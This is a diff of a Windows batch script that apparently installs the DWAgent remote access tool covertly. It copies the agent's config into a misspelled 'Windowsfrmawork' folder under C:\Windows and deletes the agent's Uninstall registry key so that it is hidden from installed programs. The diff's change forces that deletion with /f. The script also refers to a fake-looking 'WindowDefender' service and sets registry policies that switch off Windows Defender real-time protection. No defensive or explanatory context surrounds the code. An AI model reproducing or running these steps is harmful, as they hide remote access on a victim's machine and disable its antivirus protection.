@@ -40,7 +40,7 @@ copy /y "C:\Program Files\DWAge\config.json" "C:\Windows\Windowsfrmawork\config.
 
 C:\WINDOWS\system32\cmd.exe  /S /D /c" echo y "
 
-REG  DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DWAgent
+REG  DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DWAgent" /f
 
 sc query WindowDefender
 
@@ -93,10 +93,10 @@ cd ..
 cd ..
 cd c:\
 
-echo y | REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DWAgent
+echo y | REG DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DWAgent" /f
 net  start WindowDefender
 C:\WINDOWS\system32\cmd.exe  /S /D /c" echo y "
-REG  DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DWAgent
+REG  DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DWAgent" /f
 cd windows\system32
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
